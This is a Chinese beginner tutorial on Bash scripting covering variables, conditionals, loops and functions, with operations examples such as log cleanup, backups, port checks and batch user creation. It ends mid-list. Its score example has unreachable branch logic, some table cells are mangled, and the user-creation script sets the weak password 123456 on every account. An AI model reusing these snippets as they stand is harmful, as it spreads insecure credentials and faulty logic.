.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Shell脚本是Linux运维的“效率神器”——把重复的命令（如批量部署、日志清理、数据备份）写成脚本，一键执行就能替代手动操作，大幅提升工作效率。本文从零基础入手，详解Shell脚本核心语法：变量、条件判断（if-else）、循环（for/while）、函数，每个知识点搭配可直接运行的实战案例，覆盖搜索引擎高频检索需求（如Shell变量定义、if-else条件判断、for循环批量操作、Shell函数封装），适合运维新手快速上手。</p>
<h2 data-id="heading-0">一、Shell脚本入门：先搞懂“基础规则”</h2>
<h3 data-id="heading-1">1. 什么是Shell脚本？</h3>
<p>Shell脚本是“一系列Linux命令的集合”，以<code>.sh</code>为后缀，通过解释器（默认bash）执行。简单来说：把你在终端手动敲的命令，按顺序写到文件里，添加执行权限后就能批量运行。</p>
<h3 data-id="heading-2">2. 脚本基本结构（必写3要素）</h3>
<p>新建一个<code>test.sh</code>脚本，核心结构如下：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash  # 声明解释器（必须写在第一行，指定用bash执行）</span>
<span class="hljs-comment"># 这是注释（#开头的行不会执行，用于说明脚本功能）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Hello Shell!"</span>  <span class="hljs-comment"># 执行的命令（输出字符串）</span>
</code></pre>
<h3 data-id="heading-3">3. 脚本执行方式（3种常用）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 方式1：赋予执行权限后直接运行（推荐）</span>
<span class="hljs-built_in">chmod</span> +x test.sh  <span class="hljs-comment"># 添加可执行权限</span>
./test.sh         <span class="hljs-comment"># 执行脚本（./表示当前目录）</span>

<span class="hljs-comment"># 方式2：通过bash解释器执行（无需执行权限）</span>
bash test.sh

<span class="hljs-comment"># 方式3：在当前Shell环境执行（会影响当前终端，慎用）</span>
<span class="hljs-built_in">source</span> test.sh
. test.sh  <span class="hljs-comment"># 与source等价</span>
</code></pre>
<h2 data-id="heading-4">二、变量：Shell脚本的“数据容器”</h2>
<p>变量是存储数据的载体，Shell脚本中变量无需声明类型，直接赋值即可，核心分为“自定义变量”“系统变量”“位置参数变量”三类。</p>
<h3 data-id="heading-5">1. 自定义变量（最常用）</h3>
<h4 data-id="heading-6">（1）定义与赋值</h4>
<p>语法：<code>变量名=值</code>（注意：等号两边<strong>无空格</strong>，空格会被识别为命令分隔）</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 定义变量（字符串、数字均可）</span>
name=<span class="hljs-string">"张三"</span>
age=28
score=95.5

<span class="hljs-comment"># 输出变量（$变量名 或 ${变量名}，{}用于区分变量边界）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"姓名：<span class="hljs-variable">$name</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"年龄：<span class="hljs-variable">${age}</span>岁"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"分数：<span class="hljs-variable">${score}</span>"</span>
</code></pre>
<h4 data-id="heading-7">（2）变量赋值进阶</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 1. 命令结果赋值（反引号`` 或 $()，推荐$()）</span>
ip=$(ifconfig eth0 | grep inet | awk <span class="hljs-string">'{print $2}'</span>)  <span class="hljs-comment"># 获取eth0网卡IP</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"服务器IP：<span class="hljs-variable">$ip</span>"</span>

<span class="hljs-comment"># 2. 读取用户输入赋值（read命令）</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">"请输入你的手机号："</span> phone  <span class="hljs-comment"># -p：提示信息</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"你输入的手机号是：<span class="hljs-variable">$phone</span>"</span>

<span class="hljs-comment"># 3. 变量拼接</span>
prefix=<span class="hljs-string">"file_"</span>
suffix=<span class="hljs-string">".log"</span>
filename=<span class="hljs-variable">${prefix}</span>2025<span class="hljs-variable">${suffix}</span>  <span class="hljs-comment"># 拼接为file_2025.log</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"文件名：<span class="hljs-variable">$filename</span>"</span>
</code></pre>
<h3 data-id="heading-8">2. 系统变量（内置变量，直接用）</h3>
<p>Shell内置了常用系统变量，无需定义，直接调用即可：</p>








































<table><thead><tr><th>变量名</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td>$0</td><td>脚本文件名</td><td>echo "脚本名：$0" → 输出test.sh</td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo></mrow><annotation encoding="application/x-tex">1-</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">1</span><span class="mord">−</span></span></span></span></span>9</td><td>脚本位置参数（执行脚本时传入的参数）</td><td>./test.sh 10 20 → <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>=</mo><mn>10</mn><mtext>，</mtext></mrow><annotation encoding="application/x-tex">1=10，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">10</span><span class="mord cjk_fallback">，</span></span></span></span></span>2=20</td></tr><tr><td>$#</td><td>位置参数的个数</td><td>./test.sh 10 20 → $#=2</td></tr><tr><td>$?</td><td>上一条命令的执行状态（0=成功，非0=失败）</td><td>ls /tmp; echo $? → 输出0</td></tr><tr><td>$USER</td><td>当前登录用户</td><td>echo "当前用户：$USER"</td></tr><tr><td>$PWD</td><td>当前工作目录</td><td>echo "当前路径：$PWD"</td></tr></tbody></table>
<p>实战示例（位置参数）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 脚本名：param.sh</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"脚本名：<span class="hljs-variable">$0</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"第一个参数：<span class="hljs-variable">$1</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"第二个参数：<span class="hljs-variable">$2</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"参数总数：<span class="hljs-variable">$#</span>"</span>

<span class="hljs-comment"># 执行：./param.sh 北京 上海</span>
<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># 脚本名：./param.sh</span>
<span class="hljs-comment"># 第一个参数：北京</span>
<span class="hljs-comment"># 第二个参数：上海</span>
<span class="hljs-comment"># 参数总数：2</span>
</code></pre>
<h3 data-id="heading-9">3. 变量使用注意事项</h3>
<ul>
<li>变量名只能包含字母、数字、下划线，且不能以数字开头（如<code>1name</code>非法，<code>name1</code>合法）；</li>
<li>全局变量vs局部变量：默认定义的变量是全局的，函数内用<code>local</code>声明局部变量；</li>
<li>特殊字符转义：变量值包含空格/特殊字符时，用双引号包裹（如<code>path="/usr/local/bin"</code>）。</li>
</ul>
<h2 data-id="heading-10">三、条件判断（if-else）：让脚本“做选择”</h2>
<p>条件判断是脚本的“逻辑核心”——根据条件（如文件是否存在、数值大小、字符串是否相等）执行不同命令，核心语法是<code>if-else</code>。</p>
<h3 data-id="heading-11">1. 基础语法结构</h3>
<h4 data-id="heading-12">（1）单分支（满足条件才执行）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">if</span> [ 条件表达式 ]; <span class="hljs-keyword">then</span>
    执行的命令
<span class="hljs-keyword">fi</span>  <span class="hljs-comment"># 结束if（必须写）</span>
</code></pre>
<h4 data-id="heading-13">（2）双分支（满足/不满足分别执行）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">if</span> [ 条件表达式 ]; <span class="hljs-keyword">then</span>
    满足条件执行的命令
<span class="hljs-keyword">else</span>
    不满足条件执行的命令
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-14">（3）多分支（多个条件判断）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">if</span> [ 条件1 ]; <span class="hljs-keyword">then</span>
    条件1满足执行的命令
<span class="hljs-keyword">elif</span> [ 条件2 ]; <span class="hljs-keyword">then</span>
    条件2满足执行的命令
<span class="hljs-keyword">else</span>
    所有条件都不满足执行的命令
<span class="hljs-keyword">fi</span>
</code></pre>
<h3 data-id="heading-15">2. 条件表达式（核心：判断什么？）</h3>
<p>条件表达式是<code>if</code>的“判断依据”，常用3类判断：数值比较、字符串比较、文件判断。</p>
<h4 data-id="heading-16">（1）数值比较（整数）</h4>








































<table><thead><tr><th>运算符</th><th>作用</th><th>示例（判断10是否大于5）</th></tr></thead><tbody><tr><td>-eq</td><td>等于</td><td>[ 10 -eq 5 ] → 假</td></tr><tr><td>-ne</td><td>不等于</td><td>[ 10 -ne 5 ] → 真</td></tr><tr><td>-gt</td><td>大于</td><td>[ 10 -gt 5 ] → 真</td></tr><tr><td>-lt</td><td>小于</td><td>[ 10 -lt 5 ] → 假</td></tr><tr><td>-ge</td><td>大于等于</td><td>[ 10 -ge 10 ] → 真</td></tr><tr><td>-le</td><td>小于等于</td><td>[ 10 -le 15 ] → 真</td></tr></tbody></table>
<p>实战示例（判断分数是否及格）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">"请输入考试分数："</span> score
<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$score</span> -ge 60 ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"及格！"</span>
<span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$score</span> -ge 80 ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"优秀！"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"不及格！"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-17">（2）字符串比较</h4>






























<table><thead><tr><th>运算符</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td>=</td><td>等于</td><td>[ "abc" = "abc" ] → 真</td></tr><tr><td>!=</td><td>不等于</td><td>[ "abc" != "def" ] → 真</td></tr><tr><td>-z</td><td>字符串为空</td><td>[ -z "$str" ] → 字符串为空时真</td></tr><tr><td>-n</td><td>字符串非空</td><td>[ -n "$str" ] → 字符串非空时真</td></tr></tbody></table>
<p>实战示例（判断用户输入是否为空）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">"请输入你的姓名："</span> name
<span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">$name</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"错误：姓名不能为空！"</span>
<span class="hljs-keyword">elif</span> [ <span class="hljs-string">"<span class="hljs-variable">$name</span>"</span> = <span class="hljs-string">"admin"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"欢迎管理员！"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"你好，<span class="hljs-variable">$name</span>！"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-18">（3）文件判断（运维高频）</h4>








































<table><thead><tr><th>运算符</th><th>作用</th><th>示例（判断/tmp/test.log）</th></tr></thead><tbody><tr><td>-f</td><td>是否为普通文件</td><td>[ -f /tmp/test.log ] → 文件存在且是普通文件则真</td></tr><tr><td>-d</td><td>是否为目录</td><td>[ -d /tmp ] → 目录存在则真</td></tr><tr><td>-e</td><td>文件/目录是否存在</td><td>[ -e /tmp/test.log ] → 存在则真</td></tr><tr><td>-r</td><td>是否有读权限</td><td>[ -r /tmp/test.log ] → 有读权限则真</td></tr><tr><td>-w</td><td>是否有写权限</td><td>[ -w /tmp/test.log ] → 有写权限则真</td></tr><tr><td>-x</td><td>是否有执行权限</td><td>[ -x /tmp/script.sh ] → 有执行权限则真</td></tr></tbody></table>
<p>实战示例（判断文件是否存在，不存在则创建）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
file=<span class="hljs-string">"/tmp/test.log"</span>
<span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$file</span>已存在，文件大小：<span class="hljs-subst">$(du -h $file | awk '{print $1}')</span>"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$file</span>不存在，正在创建..."</span>
    <span class="hljs-built_in">touch</span> <span class="hljs-variable">$file</span>  <span class="hljs-comment"># 创建文件</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"创建成功！"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h3 data-id="heading-19">3. 条件判断避坑点</h3>
<ul>
<li>条件表达式的<code>[ ]</code>两边必须有空格（如<code>[ $score -ge 60 ]</code>，少空格会报错）；</li>
<li>变量值可能为空时，用双引号包裹（如<code>[ -z "$name" ]</code>，避免<code>[ -z ]</code>语法错误）；</li>
<li>多个条件组合：用<code>&amp;&amp;</code>（且）、<code>||</code>（或），示例：<code>if [ $age -gt 18 ] &amp;&amp; [ $age -lt 60 ]; then</code>。</li>
</ul>
<h2 data-id="heading-20">四、循环：让脚本“重复做事”</h2>
<p>循环是脚本的“效率核心”——批量处理文件、遍历服务器列表、重复执行命令都靠循环，Shell常用<code>for</code>和<code>while</code>循环。</p>
<h3 data-id="heading-21">1. for循环（遍历列表/范围）</h3>
<h4 data-id="heading-22">（1）基础语法（遍历列表）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">for</span> 变量 <span class="hljs-keyword">in</span> 列表; <span class="hljs-keyword">do</span>
    执行的命令
<span class="hljs-keyword">done</span>
</code></pre>
<p>实战示例1（遍历字符串列表）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 遍历城市列表</span>
cities=<span class="hljs-string">"北京 上海 广州 深圳"</span>
<span class="hljs-keyword">for</span> city <span class="hljs-keyword">in</span> <span class="hljs-variable">$cities</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"当前城市：<span class="hljs-variable">$city</span>"</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># 当前城市：北京</span>
<span class="hljs-comment"># 当前城市：上海</span>
<span class="hljs-comment"># 当前城市：广州</span>
<span class="hljs-comment"># 当前城市：深圳</span>
</code></pre>
<p>实战示例2（遍历数字范围）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 遍历1-5（批量创建文件）</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..5}; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">touch</span> /tmp/file_<span class="hljs-variable">$i</span>.txt  <span class="hljs-comment"># 创建file_1.txt到file_5.txt</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"已创建：/tmp/file_<span class="hljs-variable">$i</span>.txt"</span>
<span class="hljs-keyword">done</span>
</code></pre>
<p>实战示例3（遍历文件（运维高频））：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 遍历/tmp下所有.log文件，统计大小</span>
<span class="hljs-keyword">for</span> <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> /tmp/*.<span class="hljs-built_in">log</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"<span class="hljs-variable">$log</span>"</span> ]; <span class="hljs-keyword">then</span>  <span class="hljs-comment"># 确保是文件（避免目录）</span>
        size=$(<span class="hljs-built_in">du</span> -h <span class="hljs-variable">$log</span> | awk <span class="hljs-string">'{print $1}'</span>)
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$log</span> → 大小：<span class="hljs-variable">$size</span>"</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h4 data-id="heading-23">（2）C风格for循环（数值循环）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">for</span> (( 初始值; 条件; 步长 )); <span class="hljs-keyword">do</span>
    执行的命令
<span class="hljs-keyword">done</span>
</code></pre>
<p>示例（计算1-100的和）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-built_in">sum</span>=0
<span class="hljs-keyword">for</span> (( i=<span class="hljs-number">1</span>; i&lt;=<span class="hljs-number">100</span>; i++ )); <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">sum</span>=$((sum + i))  <span class="hljs-comment"># 数值计算（双括号）</span>
<span class="hljs-keyword">done</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"1-100的和：<span class="hljs-variable">$sum</span>"</span>  <span class="hljs-comment"># 输出5050</span>
</code></pre>
<h3 data-id="heading-24">2. while循环（条件满足就循环）</h3>
<h4 data-id="heading-25">（1）基础语法</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">while</span> [ 条件表达式 ]; <span class="hljs-keyword">do</span>
    执行的命令
<span class="hljs-keyword">done</span>
</code></pre>
<p>实战示例1（循环读取文件内容）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 读取/etc/passwd的每一行（逐行处理）</span>
file=<span class="hljs-string">"/etc/passwd"</span>
<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># 提取用户名（第一列，:分隔）</span>
    username=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | <span class="hljs-built_in">cut</span> -d: -f1)
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"用户名：<span class="hljs-variable">$username</span>"</span>
<span class="hljs-keyword">done</span> &lt; <span class="hljs-variable">$file</span>  <span class="hljs-comment"># &lt; 表示从文件读取内容</span>
</code></pre>
<p>实战示例2（无限循环+手动终止）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 每隔5秒检查nginx服务是否运行</span>
<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>  <span class="hljs-comment"># true表示无限循环</span>
    <span class="hljs-keyword">if</span> [ $(ps -ef | grep nginx | grep -v grep | <span class="hljs-built_in">wc</span> -l) -eq 0 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"nginx已停止，正在重启..."</span>
        systemctl start nginx
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"nginx运行正常（<span class="hljs-subst">$(date)</span>）"</span>
    <span class="hljs-keyword">fi</span>
    <span class="hljs-built_in">sleep</span> 5  <span class="hljs-comment"># 休眠5秒</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># 终止方式：Ctrl+C</span>
</code></pre>
<h3 data-id="heading-26">3. 循环控制（break/continue）</h3>
<ul>
<li><code>break</code>：终止整个循环（跳出循环）；</li>
<li><code>continue</code>：跳过当前循环，执行下一次循环。</li>
</ul>
<p>示例（遍历1-10，遇到5终止循环）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..10}; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$i</span> -eq 5 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">break</span>  <span class="hljs-comment"># 终止循环</span>
    <span class="hljs-keyword">fi</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"当前数字：<span class="hljs-variable">$i</span>"</span>
<span class="hljs-keyword">done</span>
<span class="hljs-comment"># 输出1-4</span>
</code></pre>
<p>示例（遍历1-10，跳过5）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..10}; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$i</span> -eq 5 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">continue</span>  <span class="hljs-comment"># 跳过5，继续下一次</span>
    <span class="hljs-keyword">fi</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"当前数字：<span class="hljs-variable">$i</span>"</span>
<span class="hljs-keyword">done</span>
<span class="hljs-comment"># 输出1-4、6-10</span>
</code></pre>
<h2 data-id="heading-27">五、函数：让脚本“模块化”</h2>
<p>函数是把重复的代码块封装成“可调用的命令”，减少脚本冗余，方便维护——比如把“备份数据库”“检查服务状态”封装成函数，按需调用。</p>
<h3 data-id="heading-28">1. 函数定义与调用</h3>
<h4 data-id="heading-29">（1）基础语法</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 定义函数</span>
函数名() {
    代码块
    <span class="hljs-built_in">return</span> 数值  <span class="hljs-comment"># 返回值（可选，默认返回最后一条命令的执行状态）</span>
}

<span class="hljs-comment"># 调用函数</span>
函数名 参数1 参数2
</code></pre>
<h4 data-id="heading-30">（2）实战示例（封装备份函数）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 定义备份函数（参数1：备份目录，参数2：备份文件名）</span>
<span class="hljs-function"><span class="hljs-title">backup_dir</span></span>() {
    <span class="hljs-built_in">local</span> src_dir=<span class="hljs-variable">$1</span>  <span class="hljs-comment"># 局部变量（仅函数内有效）</span>
    <span class="hljs-built_in">local</span> backup_file=<span class="hljs-variable">$2</span>
    <span class="hljs-keyword">if</span> [ -d <span class="hljs-string">"<span class="hljs-variable">$src_dir</span>"</span> ]; <span class="hljs-keyword">then</span>
        tar -zcf /tmp/<span class="hljs-variable">$backup_file</span>.tar.gz <span class="hljs-variable">$src_dir</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"备份成功：/tmp/<span class="hljs-variable">$backup_file</span>.tar.gz"</span>
        <span class="hljs-built_in">return</span> 0  <span class="hljs-comment"># 成功返回0</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"错误：目录<span class="hljs-variable">$src_dir</span>不存在！"</span>
        <span class="hljs-built_in">return</span> 1  <span class="hljs-comment"># 失败返回1</span>
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># 调用函数（备份/var/log目录）</span>
backup_dir /var/log log_backup_2025

<span class="hljs-comment"># 调用函数（备份/home目录）</span>
backup_dir /home home_backup_2025
</code></pre>
<h3 data-id="heading-31">2. 函数参数与返回值</h3>
<ul>
<li>函数参数：调用时传入的参数，用<code>$1</code>、<code>$2</code>获取（与脚本位置参数用法一致）；</li>
<li>函数返回值：
<ul>
<li>用<code>return</code>返回（仅能返回0-255的整数，0=成功，非0=失败）；</li>
<li>若需返回字符串/数值，用<code>echo</code>输出，调用时用<code>变量=$(函数名)</code>接收。</li>
</ul>
</li>
</ul>
<p>示例（返回数值计算结果）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 定义加法函数</span>
<span class="hljs-function"><span class="hljs-title">add</span></span>() {
    <span class="hljs-built_in">local</span> a=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> b=<span class="hljs-variable">$2</span>
    <span class="hljs-built_in">echo</span> $((a + b))  <span class="hljs-comment"># 用echo返回结果</span>
}

<span class="hljs-comment"># 调用函数，接收返回值</span>
result=$(add 10 20)
<span class="hljs-built_in">echo</span> <span class="hljs-string">"10+20=<span class="hljs-variable">$result</span>"</span>  <span class="hljs-comment"># 输出30</span>
</code></pre>
<h3 data-id="heading-32">3. 函数实战（运维常用）</h3>
<p>封装“检查端口是否开放”函数：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 定义检查端口函数（参数1：IP，参数2：端口）</span>
<span class="hljs-function"><span class="hljs-title">check_port</span></span>() {
    <span class="hljs-built_in">local</span> ip=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> port=<span class="hljs-variable">$2</span>
    <span class="hljs-comment"># 使用nc命令检查端口（需安装nc：yum install -y nc）</span>
    nc -z -w 2 <span class="hljs-variable">$ip</span> <span class="hljs-variable">$port</span> &gt; /dev/null 2&gt;&amp;1
    <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$ip</span>:<span class="hljs-variable">$port</span> 开放"</span>
        <span class="hljs-built_in">return</span> 0
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$ip</span>:<span class="hljs-variable">$port</span> 关闭"</span>
        <span class="hljs-built_in">return</span> 1
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># 批量检查端口</span>
check_port 192.168.1.100 80
check_port 192.168.1.100 3306
check_port 192.168.1.100 6379
</code></pre>
<h2 data-id="heading-33">六、Shell脚本实战案例（综合运用）</h2>
<h3 data-id="heading-34">案例1：批量创建用户并设置密码</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 脚本名：create_users.sh</span>
<span class="hljs-comment"># 功能：批量创建用户，密码统一为123456（生产环境需改为随机密码）</span>

<span class="hljs-comment"># 定义用户列表</span>
<span class="hljs-built_in">users</span>=<span class="hljs-string">"user1 user2 user3 user4"</span>

<span class="hljs-comment"># 循环创建用户</span>
<span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> <span class="hljs-variable">$users</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># 检查用户是否已存在</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-variable">$user</span> &gt; /dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$user</span>已存在，跳过..."</span>
        <span class="hljs-built_in">continue</span>
    <span class="hljs-keyword">fi</span>
    <span class="hljs-comment"># 创建用户</span>
    useradd <span class="hljs-variable">$user</span>
    <span class="hljs-comment"># 设置密码（echo "密码" | passwd --stdin 用户名）</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"123456"</span> | passwd --stdin <span class="hljs-variable">$user</span> &gt; /dev/null 2&gt;&amp;1
    <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$user</span>创建成功，密码：123456"</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$user</span>创建失败！"</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h3 data-id="heading-35">案例2：日志清理脚本（保留7天内日志）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 脚本名：clean_logs.sh</span>
<span class="hljs-comment"># 功能：删除/tmp下7天前的.log文件</span>

log_dir=<span class="hljs-string">"/tmp"</span>
<span class="hljs-comment"># 遍历7天前的.log文件</span>
find <span class="hljs-variable">$log_dir</span> -name <span class="hljs-string">"*.log"</span> -mtime +7 -<span class="hljs-built_in">type</span> f | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> log_file; <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># 删除文件</span>
    <span class="hljs-built_in">rm</span> -f <span class="hljs-variable">$log_file</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"已删除：<span class="hljs-variable">$log_file</span>"</span>
<span class="hljs-keyword">done</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"日志清理完成！"</span>
</code></pre>
<h2 data-id="heading-36">七、Shell脚本避坑指南（新手必看）</h2>
<ol>
<li><strong>语法错误</strong>：<code>if</code>的<code>[ ]</code>两边加空格、变量赋值等号无空格、循环/函数结尾的<code>done</code>/<code>fi</code>/<code>}</code>必须写；</li>
<li><strong>路径问题</strong>：脚本中尽量用绝对路径（如<code>/tmp/test.log</code>），避免相对路径导致执行失败；</li>
<li><strong>权限问题</strong>：脚本执行时需有对应权限（如创建文件需写权限，删除文件需删权限）；</li>
